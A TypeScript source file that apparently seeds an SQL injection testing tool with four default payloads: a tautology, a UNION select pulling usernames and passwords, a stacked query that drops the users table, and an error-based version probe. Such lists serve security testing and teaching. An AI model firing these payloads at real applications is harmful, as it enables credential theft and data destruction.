import { SQLPayload } from '../types';

export const defaultPayloads: SQLPayload[] = [
  {
    id: '1',
    name: 'Basic Tautology',
    description: 'Always true condition using OR',
    category: 'tautology',
    value: "' OR '1'='1"
  },
  {
    id: '2',
    name: 'Union Select',
    description: 'Basic UNION-based injection',
    category: 'union',
    value: "' UNION SELECT username, password FROM users--"
  },
  {
    id: '3',
    name: 'Stacked Queries',
    description: 'Multiple query execution',
    category: 'stacked',
    value: "'; DROP TABLE users--"
  },
  {
    id: '4',
    name: 'Error-Based',
    description: 'Trigger database errors',
    category: 'error',
    value: "' AND 1=CONVERT(int, (SELECT @@version))--"
  }
];